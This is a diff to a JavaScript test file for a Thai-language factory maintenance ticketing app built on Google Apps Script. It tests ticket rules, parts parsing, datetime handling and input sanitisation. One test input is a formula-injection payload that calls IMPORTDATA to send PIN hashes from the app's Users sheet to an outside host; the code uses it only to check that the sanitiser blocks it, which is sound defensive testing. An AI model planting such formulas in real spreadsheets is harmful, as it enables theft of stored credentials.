@@ -23,7 +23,7 @@ vm.runInNewContext(
   "              overlapHours, stopSpan, breakdownSpan, periodWindow," +
   "              techScore, TECH_MIN_N, waitedOutside, loggedWell, techDrill," +
   "              techTotal, TECH_WEIGHT_DEFAULT, TECH_INVERTED, KPI_PICK, ROLE_KPI, TS_COL," +
-  "              stationMachines, isMyMachine, myStation, ticketScope };" +
+  "              stationMachines, isMyMachine, myStation, ticketScope, dtLocal, openTicketsOf };" +
   "\nthis.setME = (v) => { ME = v };" +
   "\nthis.setPmCal = (v) => { pmCal = v };" +
   "\nthis.setMachines = (v) => { MACHINES = v };",
@@ -38,7 +38,125 @@ const { fmtDuration, hoursBetween, elapsedHours,
         techScore, TECH_MIN_N, waitedOutside, loggedWell, techDrill,
         techTotal, TECH_WEIGHT_DEFAULT, TECH_INVERTED, KPI_PICK,
         ROLE_KPI, TS_COL, stationMachines, isMyMachine, myStation,
-        ticketScope } = sandbox.fns;
+        ticketScope, dtLocal, openTicketsOf } = sandbox.fns;
+
+/* ═══ สมุดเครื่องจักร: คอลัมน์ "ใบค้าง" ═══
+   นับเฉพาะใบที่ยังไม่จบจริง ๆ ถ้านับใบที่ปิดหรือยกเลิกไปแล้วด้วย
+   หน้าจอจะบอกว่าเครื่องมีงานค้างตลอดกาล แล้วคนจะเลิกเชื่อตัวเลขนี้ทั้งคอลัมน์ */
+{
+  sandbox.setTickets([
+    { ticket_id: "MT-1", machine_name: "Cut-Slot 2", status: STATUS.REPAIR },
+    { ticket_id: "MT-2", machine_name: "Cut-Slot 2", status: STATUS.WAIT },
+    { ticket_id: "MT-3", machine_name: "Cut-Slot 2", status: STATUS.DONE },    // ปิดแล้ว
+    { ticket_id: "MT-4", machine_name: "Cut-Slot 2", status: STATUS.CANCEL },  // ยกเลิกแล้ว
+    { ticket_id: "MT-5", machine_name: "UV 2",       status: STATUS.OUT },
+  ]);
+  assert.deepStrictEqual(openTicketsOf("Cut-Slot 2").map((t) => t.ticket_id), ["MT-1", "MT-2"]);
+  assert.strictEqual(openTicketsOf("UV 2").length, 1);
+  assert.strictEqual(openTicketsOf("เครื่องที่ไม่มีใบเลย").length, 0);
+  sandbox.setTickets([]);
+}
+
+/* ═══ ตัวเสนอรหัสสาเหตุ (suggestCause_ ใน Code.gs) ═══
+   ใช้กับหน้าไล่ติดรหัสย้อนหลัง — เสนอเท่านั้น คนกดยืนยันทุกใบ
+   เคสทดสอบเอามาจากข้อความจริงในระบบ ไม่ได้แต่งขึ้นเอง
+   ลำดับใน CAUSE_HINTS สำคัญ ตัวแรกที่เจอชนะ สลับลำดับแล้วผลเปลี่ยนเงียบ ๆ */
+{
+  const gas = fs.readFileSync("gas/Code.gs", "utf8");
+  const hints = gas.match(/var CAUSE_HINTS = \[[\s\S]*?\n\];/);
+  const fn = gas.match(/function suggestCause_\(text\) \{[\s\S]*?\n\}/);
+  assert.ok(hints && fn, "หา CAUSE_HINTS / suggestCause_ ไม่เจอ");
+  const CAUSE_HINTS = eval(hints[0].replace("var CAUSE_HINTS = ", ""));
+  const suggest = eval("(" + fn[0].replace("function suggestCause_", "function") + ")");
+  const code = (t) => (suggest(t) || {}).code || null;
+
+  assert.strictEqual(code("เบรกเกอร์ระเบิดของ hot mix"), "ระบบไฟฟ้า/คอนโทรล");
+  assert.strictEqual(code("คาดว่าแมคเนติคเสีย"), "ระบบไฟฟ้า/คอนโทรล");
+  assert.strictEqual(code("เปลี่ยนลูกปืนฝั่งขับ"), "ลูกปืน/แบริ่ง");
+  assert.strictEqual(code("ตั้งอะลายเม้นชุดพาชิ้นงาน"), "ตั้งค่า/ใช้งานผิดวิธี");
+  // งานที่ไม่ใช่เครื่องจักร ต้องไม่ถูกยัดรหัสมั่ว — เดาไม่ได้ก็ต้องตอบว่าเดาไม่ได้
+  assert.strictEqual(code("ฝาชักโครกห้องน้ำหญิงชำรุด"), null);
+  assert.strictEqual(code(""), null);
+  assert.strictEqual(code(null), null);
+  // ทุกรหัสที่เสนอได้ ต้องมีอยู่จริงในรายการตั้งต้น ไม่งั้นเสนอแล้ว server ปฏิเสธ
+  const defaults = gas.match(/var CAUSE_CODES_DEFAULT = \[[\s\S]*?\n\];/)[0]
+    .replace("var CAUSE_CODES_DEFAULT = ", "");
+  const codes = eval(defaults);
+  for (const [c] of CAUSE_HINTS) assert.ok(codes.includes(c), "รหัสไม่อยู่ในรายการ: " + c);
+}
+
+/* ═══ กฎกันปลดเครื่องก่อนเวลา (isDownTicket_ ใน Code.gs) ═══
+   ตรวจรับใบหนึ่งผ่าน ไม่ได้แปลว่าทุกเรื่องที่ทำให้เครื่องหยุดจบแล้ว
+   ถ้าปลดให้เดินทั้งที่ยังมีใบอื่นค้าง สมุดเครื่องจักรจะบอกว่าเครื่องเดินอยู่ทั้งที่ยังซ่อมไม่เสร็จ
+   ผิดแบบที่ไม่มีใครจับได้ เพราะหน้าจอดูปกติทุกอย่าง */
+{
+  const gas = fs.readFileSync("gas/Code.gs", "utf8");
+  const m = gas.match(/function isDownTicket_\(t, machine, exceptId\) \{[\s\S]*?\n\}/);
+  assert.ok(m, "หา isDownTicket_ ใน Code.gs ไม่เจอ");
+  const MACHINE_DOWN_YES = "หยุดเดิน";
+  const STATUS_DONE = "ซ่อมเสร็จสมบูรณ์", STATUS_CANCEL = "ยกเลิก";
+  const isDown = eval("(" + m[0].replace("function isDownTicket_", "function") + ")");
+
+  const T = (id, machine, down, status) =>
+    ({ ticket_id: id, machine_name: machine, machine_down: down, status });
+
+  // ใบอื่นที่ยังไม่จบและบอกว่าเครื่องหยุด = ยังปลดไม่ได้
+  assert.strictEqual(isDown(T("MT-2", "UV 1", "หยุดเดิน", "กำลังซ่อม"), "UV 1", "MT-1"), true);
+  // ใบที่กำลังตรวจรับอยู่เอง ต้องไม่นับตัวเอง ไม่งั้นจะไม่มีวันปลดได้เลยสักครั้ง
+  assert.strictEqual(isDown(T("MT-1", "UV 1", "หยุดเดิน", "กำลังซ่อม"), "UV 1", "MT-1"), false);
+  // ปิดหรือยกเลิกไปแล้ว ไม่ใช่เหตุให้เครื่องหยุดอีกต่อไป
+  assert.strictEqual(isDown(T("MT-3", "UV 1", "หยุดเดิน", STATUS_DONE), "UV 1", "MT-1"), false);
+  assert.strictEqual(isDown(T("MT-4", "UV 1", "หยุดเดิน", STATUS_CANCEL), "UV 1", "MT-1"), false);
+  // ใบที่บอกว่าเครื่องยังเดินได้ ไม่ขวางการปลด
+  assert.strictEqual(isDown(T("MT-5", "UV 1", "เดินต่อได้", "กำลังซ่อม"), "UV 1", "MT-1"), false);
+  // ใบเก่าที่ยังไม่มีคอลัมน์นี้ (ค่าว่าง) ก็ไม่ขวาง
+  assert.strictEqual(isDown(T("MT-6", "UV 1", "", "กำลังซ่อม"), "UV 1", "MT-1"), false);
+  // คนละเครื่องไม่เกี่ยวกัน
+  assert.strictEqual(isDown(T("MT-7", "UV 2", "หยุดเดิน", "กำลังซ่อม"), "UV 1", "MT-1"), false);
+}
+
+/* ═══ กันสูตรหลุดลงชีต (deFormula_ ใน Code.gs) ═══
+   หน้าแจ้งซ่อมไม่ต้องล็อกอิน ถ้าสตริงที่ขึ้นต้นด้วย = ถูกเขียนลงชีตดิบ ๆ
+   มันกลายเป็นสูตรที่รันด้วยสิทธิ์เจ้าของไฟล์ แล้วอ่าน PIN hash ในชีต Users ส่งออกได้ */
+{
+  const gas = fs.readFileSync("gas/Code.gs", "utf8");
+  const m = gas.match(/function deFormula_\(v\) \{[\s\S]*?\n\}/);
+  assert.ok(m, "หา deFormula_ ใน Code.gs ไม่เจอ");
+  const deFormula_ = eval("(" + m[0].replace("function deFormula_", "function") + ")");
+
+  assert.strictEqual(deFormula_('=IMPORTDATA("https://x/?a="&Users!E2)'),
+                     '\'=IMPORTDATA("https://x/?a="&Users!E2)');
+  assert.strictEqual(deFormula_("+1+1"), "'+1+1");
+  assert.strictEqual(deFormula_("@sum"), "'@sum");
+  // ข้อความปกติต้องไม่ถูกแตะ ไม่งั้น ' จะไปเกาะหน้าทุกใบ
+  assert.strictEqual(deFormula_("เบรกเกอร์ระเบิดของ hot mix"), "เบรกเกอร์ระเบิดของ hot mix");
+  // จงใจไม่ดัก "-" เพราะช่างขึ้นต้นบรรทัดด้วย - เป็นปกติเวลาไล่รายการที่ทำ
+  assert.strictEqual(deFormula_("-เปลี่ยนลูกปืน -ทำความสะอาด"), "-เปลี่ยนลูกปืน -ทำความสะอาด");
+  assert.strictEqual(deFormula_(""), "");
+  assert.strictEqual(deFormula_(null), null);
+  assert.strictEqual(deFormula_(123), 123);          // ตัวเลขกับ Date ต้องผ่านไปทั้งก้อน
+}
+
+/* ═══ ช่องลงเวลาย้อนหลัง ═══
+   <input type="datetime-local"> อ่าน/เขียนเป็นเวลาท้องถิ่น ส่วนค่าในใบเป็น ISO (UTC)
+   ถ้าลืมหักออฟเซ็ต เวลาจะเลื่อนไป 7 ชม. ทุกครั้งที่เปิดใบมาแก้ — เงียบและสะสม */
+{
+  const d = new Date(2026, 9, 8, 14, 35);                 // 8 ต.ค. 2026 14:35 เวลาท้องถิ่น
+  assert.strictEqual(dtLocal(d.toISOString()), "2026-10-08T14:35");
+  // ค่าที่ช่องคืนมา แปลงกลับเป็น ISO แล้วต้องได้นาทีเดิม ไม่งั้นแก้ครั้งเดียวเวลาเพี้ยน
+  assert.strictEqual(new Date(dtLocal(d.toISOString())).getTime(), d.getTime());
+  assert.strictEqual(dtLocal(""), "");
+  assert.strictEqual(dtLocal(null), "");
+  assert.strictEqual(dtLocal("ไม่ใช่วันที่"), "");        // ใบเก่าที่ช่องเวลาเป็นข้อความมั่ว
+
+  /* saveBackdate ตัดสินว่า "ช่องนี้เปลี่ยนไหม" ด้วย raw === dtLocal(ค่าในใบ)
+     จะถูกต้องก็ต่อเมื่อ dtLocal ของค่าที่ตัดวินาทีแล้ว ได้เท่าเดิม
+     server ประทับเวลาด้วย new Date() ซึ่งมีวินาทีติดมา ถ้าเทียบคนละหน่วย
+     ช่องที่ไม่ได้แตะจะถูกส่งทุกครั้ง แล้วได้แถว Audit ปลอม 14:03:27 → 14:03:00 */
+  const stamped = new Date(2026, 9, 8, 14, 3, 27).toISOString();
+  assert.strictEqual(dtLocal(stamped), "2026-10-08T14:03");
+  assert.strictEqual(dtLocal(dtLocal(stamped)), dtLocal(stamped));
+}
 
 /* ═══ เวลา ═══ */
 assert.strictEqual(fmtDuration(2.5), "2 ชม. 30 น.");
@@ -295,7 +413,13 @@ assert.strictEqual(xl[3][SHEET1_HEADERS.indexOf("เวลาซ่อมจบ"
 {
   const idx = fs.readFileSync("gas/index.html", "utf8");
   const tags = idx.match(/<\?[\s\S]*?\?>/g) || [];
-  const allowed = ['<?!= include("styles") ?>', '<?= prefillMachine ?>', '<?!= include("app") ?>'];
+  const allowed = ['<?!= include("tw") ?>', '<?!= include("styles") ?>',
+                   '<?= prefillMachine ?>', '<?!= include("app") ?>'];
+  /* tw ต้องมา "หลัง" styles — ตัว CDN เดิมฉีด <style> เข้ามาทีหลังเสมอ ทั้งไฟล์เขียนบนสมมติฐานนั้น
+     เคยสลับมาไว้ข้างหน้าแล้วพังทันที: .hidden กับ .tab-btn specificity เท่ากัน ลำดับเป็นตัวตัดสิน
+     .tab-btn{display:flex} ชนะ เมนูที่ต้องซ่อนตอนไม่ล็อกอินโผล่หมด จุดแดงกระดิ่งค้างติด */
+  assert.ok(idx.indexOf('include("styles")') < idx.indexOf('include("tw")'),
+    'include("tw") ต้องอยู่หลัง include("styles")');
   tags.forEach((t) => {
     assert.ok(allowed.includes(t),
       "scriptlet แปลกปลอมใน index.html: " + t + " — ห้ามเขียน <? ?> แม้ในคอมเมนต์");
@@ -668,6 +792,8 @@ assert.ok(!hasName(undefined, "ช่างชล"));
   const gas = {};
   vm.runInNewContext(fs.readFileSync("gas/Code.gs", "utf8"), gas);
   gas.SpreadsheetApp = { flush: () => {} };
+  /* pmBuildSchedule_ ถือล็อกตอนเขียนแล้ว กันสองคนกางตารางพร้อมกันแล้วเขียนทับกัน */
+  gas.LockService = { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) };
   gas.writeAudit_ = () => {};
   gas.sendMail_ = () => {};
   gas.cfg_ = (k, d) => d;
@@ -742,7 +868,7 @@ assert.ok(!hasName(undefined, "ช่างชล"));
   const qr = (v) => { gas.cfg_ = () => v; return gas.beerQrUrl_(); };
 
   assert.strictEqual(qr(""), "", "ไม่ได้ตั้งค่าไว้ = ไม่โชว์ช่องทางโอน");
-  const id = "1AbCdEfGhIjKlMnOpQrStUvWxYz01234";
+  const id = "1PxvE1q93ctPXjBNSDrWgnEY-EK2MZwXn";
   assert.ok(qr(id).indexOf(id) > -1);
   // ลิงก์แชร์ทั้งเส้นคือสิ่งที่คนวางมาจริง ๆ — เคยทำใบแจ้งซ่อมหายมาแล้วตอนตั้ง DRIVE_FOLDER_ID
   assert.strictEqual(qr("https://drive.google.com/file/d/" + id + "/view?usp=drive_link"), qr(id));
@@ -1175,6 +1301,8 @@ function paramGas() {
   gas.assertKnownMachine_ = (m) => String(m);
   gas.writeAudit_ = () => {};
   gas.SpreadsheetApp = { flush: () => {} };
+  /* pmBuildSchedule_ ถือล็อกตอนเขียนแล้ว กันสองคนกางตารางพร้อมกันแล้วเขียนทับกัน */
+  gas.LockService = { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) };
   gas.readSheet_ = () => [{
     "เครื่องจักร": "Cut", "งาน PM": "ล้าง Cooling Tower", "รอบ (วัน)": 30,
     "ทำครั้งล่าสุด": "", "ผู้รับผิดชอบ": "ช่างชล", "ใช้งาน": "ใช่",
@@ -1210,6 +1338,8 @@ function paramGas() {
   gas.requireAuth_ = () => ({ name: "ช่างชล", role: "TECH" });
   gas.writeAudit_ = () => {};
   gas.SpreadsheetApp = { flush: () => {} };
+  /* pmBuildSchedule_ ถือล็อกตอนเขียนแล้ว กันสองคนกางตารางพร้อมกันแล้วเขียนทับกัน */
+  gas.LockService = { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) };
 
   const H = gas.PMCAL_HEAD;
   const makeSheet = (head) => {
@@ -1279,7 +1409,7 @@ function paramGas() {
 {
   const gas = {};
   vm.runInNewContext(fs.readFileSync("gas/Code.gs", "utf8"), gas);
-  const ID = "1AbCdEfGhIjKlMnOpQrStUvWxYz01234";
+  const ID = "1PxvE1q93ctPXjBNSDrWgnEY-EK2MZwXn";
 
   assert.strictEqual(gas.driveId_(ID + "?usp=drive_link"), ID, "ค่าที่เจอจริงเมื่อวาน");
   assert.strictEqual(gas.driveId_(ID + "?usp=sharing"), ID);
@@ -1369,6 +1499,8 @@ function paramGas() {
   gas.writeAudit_ = () => {};
   gas.canonical_ = (v) => String(v || "");
   gas.SpreadsheetApp = { flush: () => {} };
+  /* pmBuildSchedule_ ถือล็อกตอนเขียนแล้ว กันสองคนกางตารางพร้อมกันแล้วเขียนทับกัน */
+  gas.LockService = { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) };
   gas.cfg_ = (k, d) => d;
   gas.Session = { getScriptTimeZone: () => "Asia/Bangkok" };
   gas.Utilities = { formatDate: (d) => {
@@ -3014,12 +3146,12 @@ console.log("OK — ผ่านทั้งหมด");
   gas.verify_ = (t) => t === "good";
 
   const full = { machines: [{ name: "EXT 1" }], team: [{ name: "\u0e0a\u0e48\u0e32\u0e07\u0e0a\u0e25", role: "TECH" }],
-                 companyName: "ACME" };
+                 companyName: "BRT" };
 
   const anon = gas.configForViewer_(full, "");
   assert.strictEqual(J(anon.team), J([]), "ไม่มี token = ไม่ได้รายชื่อพนักงาน");
   assert.strictEqual(anon.machines.length, 1, "ทะเบียนเครื่องต้องยังมี — ฝ่ายผลิตแจ้งซ่อมโดยไม่ล็อกอิน");
-  assert.strictEqual(anon.companyName, "ACME");
+  assert.strictEqual(anon.companyName, "BRT");
   assert.strictEqual(gas.configForViewer_(full, "good").team.length, 1, "ล็อกอินแล้วเห็นครบ");
 
   // ตัดสำเนา ไม่ใช่ตัดของจริงในแคช
@@ -3064,4 +3196,168 @@ console.log("OK — ผ่านทั้งหมด");
     "เจอ PIN อ่อนแล้วต้องโยนทิ้ง ไม่ใช่คำนวณไว้เฉย ๆ แล้วบันทึกต่อ");
   assert.ok(/isActive_\(rows\[i\]\[US\.ACTIVE\]\)/.test(login),
     'ช่อง "ใช้งาน" เป็นคำว่า "ไม่" ก็ต้องกันได้ ไม่ใช่เฉพาะ false');
+}
+
+
+/* ═══ fillMachineOwners() — งานครั้งเดียว แต่เขียนทับข้อมูลคนอื่นได้ ═══
+   เคยทำทะเบียนพังมาแล้วครั้งหนึ่งตอนคลิกผิดช่อง — ครั้งนี้จึงต้องมีเทสต์ */
+{
+  const gas = {};
+  vm.runInNewContext(fs.readFileSync("gas/Code.gs", "utf8"), gas);
+  gas.Logger = { log: () => {} };
+  gas.clearCache = () => {};
+
+  const HEAD = ["รหัสเครื่อง", "ชื่อเครื่องจักร", "ผู้ดูแล"];
+  const rows = [
+    HEAD,
+    ["A1", "Extrusion 1 - 80", "EXT"],       // มีค่าอยู่แล้ว และไม่อยู่ในรายการ
+    ["A2", "Powder mill", ""],
+    ["A3", "Exhaust fan-UV1", ""],
+    ["A4", "Arm saw", "SLOT"],               // มีคนกรอกไว้แล้ว ห้ามทับ
+    ["A5", "เครื่องที่ไม่อยู่ในรายการ", ""],
+  ];
+  const wrote = [];
+  gas.sheet_ = () => ({
+    getDataRange: () => ({ getValues: () => rows }),
+    getRange: (r, c) => ({ setValue: (v) => { wrote.push([r, c, v]); rows[r - 1][c - 1] = v; } }),
+  });
+
+  const msg = gas.fillMachineOwners();
+
+  assert.strictEqual(J(wrote), J([[3, 3, "EXT"], [4, 3, "UV"]]),
+    "เติมเฉพาะช่องว่าง และต้องเป็นแถวของชื่อนั้นจริง");
+  assert.strictEqual(rows[4][2], "SLOT", "ของที่มีคนกรอกไว้แล้วห้ามเขียนทับ");
+  assert.ok(msg.indexOf("Arm saw") > -1, "ตัวที่ข้ามต้องรายงาน ไม่ใช่เงียบไป");
+  assert.ok(/✗ Wpc crusher/.test(msg), "ชื่อในตารางที่หาไม่เจอในทะเบียนต้องฟ้อง");
+  assert.ok(!/✗ Powder mill/.test(msg),
+    "เครื่องที่เติมสำเร็จแล้วต้องไม่ขึ้นว่าหาไม่เจอ");
+
+  // รันซ้ำแล้วต้องไม่เขียนอะไรเพิ่ม
+  wrote.length = 0;
+  gas.fillMachineOwners();
+  assert.strictEqual(wrote.length, 0, "รันซ้ำต้องไม่เขียนซ้ำ");
+
+  /* ค่าทุกตัวต้องเป็นสถานีที่มีอยู่จริง — พิมพ์ผิดตัวเดียวก็เงียบหาย */
+  const USED = ["EXT", "UV", "SLOT", "XPE", "MT"];
+  Object.keys(gas.OWNER_FILL).forEach((k) => {
+    assert.ok(USED.includes(gas.OWNER_FILL[k]), `${k}: สถานี "${gas.OWNER_FILL[k]}" ไม่มีในระบบ`);
+  });
+  assert.strictEqual(Object.keys(gas.OWNER_FILL).length, 12, "มี 12 เครื่องที่รออยู่");
+}
+
+/* ═══ อะไหล่หลายรหัสต่อหนึ่งใบ (parseParts_ / partsText_ ใน Code.gs) ═══
+   รหัสอะไหล่ของจริงมีทั้งขีด ทั้งตัวอักษรปนตัวเลข และบางตัวลงท้ายด้วยตัวเลข
+   ซึ่งเป็นจุดที่ regex พังได้ง่ายที่สุด — "60002048M006-0005 x 2" ต้องไม่ถูกหั่นผิดที่ */
+{
+  const gas = {};
+  vm.runInNewContext(fs.readFileSync("gas/Code.gs", "utf8"), gas);
+  const { parseParts_, partsText_, PARTS_MAX } = gas;
+  const J = JSON.stringify;
+
+  assert.strictEqual(J(parseParts_("60002048M006-0005 x 2")),
+    J([{ code: "60002048M006-0005", qty: 2 }]),
+    "รหัสที่ลงท้ายด้วยตัวเลขห้ามถูกตัดรวมกับจำนวน");
+
+  assert.strictEqual(J(parseParts_("A-1 x 2\nB-2 X 1\nC-3 × 0.5")),
+    J([{ code: "A-1", qty: 2 }, { code: "B-2", qty: 1 }, { code: "C-3", qty: 0.5 }]),
+    "หลายบรรทัด · x ตัวใหญ่ · × ของไทย และจำนวนทศนิยม (น้ำมัน 0.5 ลิตร)");
+
+  /* ขนาดซีล/โอริง/สายพาน เขียนเป็น AxBxC เป็นเรื่องปกติ ของเดิมอ่าน
+     "Oil seal TC 35x52x7" เป็นรหัส "Oil seal TC 35x52" จำนวน 7
+     ซีลตัวเดียวกลายเป็นเจ็ดตัวในแผ่นที่คลังเอาไปตัดสต๊อก — ต้องไม่ผ่าน
+     เพราะบรรทัดนั้นไม่ได้บอกจำนวนมาจริง ๆ */
+  assert.throws(() => parseParts_("Oil seal TC 35x52x7"), /ผิดรูปแบบ/,
+    "บรรทัดที่ไม่มีจำนวน ห้ามถูกอ่านว่าเลขขนาดคือจำนวน");
+  assert.strictEqual(J(parseParts_("Oil seal 35x52x7 x 1")),
+    J([{ code: "OIL SEAL 35X52X7", qty: 1 }]),
+    "ขนาดอยู่ในรหัสได้ ถ้าตัวคั่นจริงมีเว้นวรรคนำหน้า");
+  assert.strictEqual(J(parseParts_("สายพาน 2x4 x 10")),
+    J([{ code: "สายพาน 2X4", qty: 10 }]), "ของไทยปนเลขขนาดก็ต้องอ่านถูก");
+
+  /* Number() เขียน 1e21 กลับเป็น "1e+21" ซึ่ง regex อ่านไม่ออก
+     = server เขียนข้อความที่ตัวเองอ่านไม่ได้ลงชีต แล้วแก้ใบนั้นครั้งหน้าไม่ได้อีก */
+  assert.throws(() => parseParts_("A-1 x 100000000000000000000000"), /ไม่สมเหตุสมผล/);
+  assert.throws(() => parseParts_("A-1 x 0.0000001"), /ไม่สมเหตุสมผล/);
+
+  assert.strictEqual(J(parseParts_("")), J([]), "ค่าว่างคือลบรายการทั้งหมด ไม่ใช่ error");
+  assert.strictEqual(J(parseParts_(null)), J([]));
+  assert.strictEqual(J(parseParts_("\n\n  \n")), J([]), "บรรทัดเปล่าต้องถูกข้าม");
+
+  assert.throws(() => parseParts_("ลูกปืน 6204"), /ผิดรูปแบบ/,
+    "ไม่มีจำนวนต้องฟ้อง ไม่ใช่เดาให้เป็น 1");
+  assert.throws(() => parseParts_("A-1 x 0"), /มากกว่า 0/);
+  assert.throws(() => parseParts_("x 3"), /รหัสอะไหล่/);
+  assert.throws(() => parseParts_("A-1 x 1\na-1 x 2"), /ซ้ำกัน/,
+    "รหัสซ้ำต่างตัวพิมพ์ก็คือซ้ำ — คงเหลือใน ERP จะถูกหักสองรอบ");
+
+  const many = Array.from({ length: PARTS_MAX + 1 }, (_, i) => `P${i} x 1`).join("\n");
+  assert.throws(() => parseParts_(many), /ไม่เกิน/);
+  assert.strictEqual(parseParts_(many.split("\n").slice(0, PARTS_MAX).join("\n")).length, PARTS_MAX,
+    "เท่ากับเพดานพอดีต้องผ่าน");
+
+  // เขียนกลับต้องเป็นรูปแบบเดียวเสมอ แล้ว parse ซ้ำได้ค่าเดิม
+  const t = partsText_(parseParts_("a-1   X   2\n  b-2 × 3  "));
+  assert.strictEqual(t, "A-1 x 2\nB-2 x 3",
+    "ช่องว่างเกินกับตัวพิมพ์เล็กต้องถูกบีบเป็นรูปแบบเดียวตั้งแต่ตอนเก็บ — " +
+    "ไม่งั้นลูกปืนตัวเดียวแตกเป็นหลายรหัสแบบที่ชื่อเครื่องจักรเคยแตก 117 แบบ");
+  assert.strictEqual(J(parseParts_(t)), J(parseParts_("A-1 x 2\nB-2 x 3")), "parse ซ้ำได้ค่าเดิม");
+}
+
+/* ═══ ปิดงานต้องผ่านการตรวจรับเท่านั้น ═══
+   ช่างที่ล็อกอินแล้วยิง apiUpdateTicket ตรง ๆ เคยตั้งสถานะ "ซ่อมเสร็จสมบูรณ์" เองได้
+   ข้ามขั้นตอนที่ฝ่ายผลิตเซ็นรับงาน แล้วบันทึกการตรวจรับทั้งชุดกลายเป็นของปลอม
+   เทียบระดับซอร์ส เพราะเส้นทางจริงต้องมีทั้งชีตและ token ถึงจะรันได้ */
+{
+  const gas = fs.readFileSync("gas/Code.gs", "utf8");
+  const fn = gas.slice(gas.indexOf("function apiUpdateTicket"),
+                       gas.indexOf("function apiBulkUpdate"));
+  assert.ok(/changes\.status === STATUS_DONE/.test(fn) && /throw/.test(fn),
+    "apiUpdateTicket ต้องปฏิเสธการตั้งสถานะปิดงานเอง");
+
+  // ทางเดียวที่ตั้ง STATUS_DONE ได้ต้องอยู่ใน apiVerifyTicket และ server เป็นคนตั้งเอง
+  // apiVerifyTicket อยู่หลัง apiUpdateTicket ในไฟล์ ตัดไปข้างหน้าเอา
+  const vs = gas.indexOf("function apiVerifyTicket");
+  const vf = gas.slice(vs, vs + 4000);
+  assert.ok(/safe\.status = STATUS_DONE/.test(vf),
+    "apiVerifyTicket ต้องเป็นที่เดียวที่ตั้งสถานะปิดงาน");
+
+  const app = fs.readFileSync("gas/app.html", "utf8");
+  const ap = app.slice(app.indexOf("function approve(id)"), app.indexOf("function reject(id)"));
+  assert.ok(/verify:\s*true/.test(ap),
+    "หน้าจอตรวจรับต้องยิงไปที่ apiVerifyTicket ไม่ใช่ apiUpdateTicket");
+}
+
+/* ═══ ชีตพิกัดทรงกว้าง Std.parameter ของโรงงาน ═══
+   แถวจริงจากไฟล์ EXT Condition data — EXT1 ไม่มีโซน 6-7 จึงเขียน 0 ไว้
+   ถ้าอ่าน 0 เป็นพิกัดจะได้ 0±10 แล้วหน้าจอฟ้องว่าหลุดสเปกทุกแถว ซึ่งแย่กว่าไม่ฟ้องเลย */
+{
+  const gas = {};
+  vm.runInNewContext(fs.readFileSync("gas/Code.gs", "utf8"), gas);
+  const { paramStdName_, paramStdWide_ } = gas;
+
+  assert.strictEqual(paramStdName_("STD Z1"), "ZONE 1", "ชื่อในชีตพิกัดต้องแปลงให้ตรงชีตบันทึก");
+  assert.strictEqual(paramStdName_("STD T-Die Z3"), "MOLD 3");
+  assert.strictEqual(paramStdName_("std t die z7"), "MOLD 7", "ตัวพิมพ์เล็กกับเว้นวรรคก็ต้องได้");
+  assert.strictEqual(paramStdName_("STD FEED"), "FEED", "ชื่ออื่นแค่ตัด STD ออก");
+
+  const raw = ["Machine", "STD Z1", "STD Z2", "STD Z6", "STD T-Die Z1", "หมายเหตุ"];
+  const rows = [
+    ["EXT3", 195, 200, 180, 200, "บวก - ลบ ไม่เกิน 10องศา"],
+    ["EXT1", 185, 205, 0, 165, "บวก - ลบ ไม่เกิน 10องศา"],   // Z6 = ไม่มีโซนนี้
+    ["", 1, 2, 3, 4, ""],                                      // ไม่มีชื่อเครื่อง = ข้าม
+  ];
+  const out = paramStdWide_(rows, raw, 0);
+
+  assert.strictEqual(Object.keys(out).sort().join(","), "EXT1,EXT3", "แถวไม่มีชื่อเครื่องต้องถูกข้าม");
+  assert.strictEqual(out.EXT3.std["ZONE 1"], 195);
+  assert.strictEqual(out.EXT3.std["MOLD 1"], 200, "คอลัมน์ T-Die ต้องไปอยู่ชื่อ MOLD");
+  assert.strictEqual(out.EXT3.tol.all, 10, '"บวก - ลบ ไม่เกิน 10องศา" ต้องอ่านเกณฑ์ออกเป็น 10');
+  assert.ok(!("ZONE 6" in out.EXT1.std),
+    "0 แปลว่าเครื่องรุ่นนี้ไม่มีโซนนั้น ห้ามกลายเป็นพิกัด 0");
+  assert.strictEqual(out.EXT1.std["ZONE 6"], undefined);
+  assert.strictEqual(out.EXT3.std["ZONE 6"], 180, "เครื่องที่มีโซนนั้นจริงต้องยังได้พิกัด");
+
+  // ชีตที่ไม่มีคอลัมน์ขึ้นต้นด้วย STD เลย = ไม่ใช่ทรงกว้าง ต้องคืนค่าว่าง ไม่ใช่เดามั่ว
+  assert.strictEqual(Object.keys(paramStdWide_([["A", 1]], ["Machine", "อะไรสักอย่าง"], 0)).length, 0,
+    "ไม่มีคอลัมน์ขึ้นต้นด้วย STD = ไม่ใช่ทรงกว้าง ต้องคืนค่าว่าง ไม่ใช่เดามั่ว");
 }
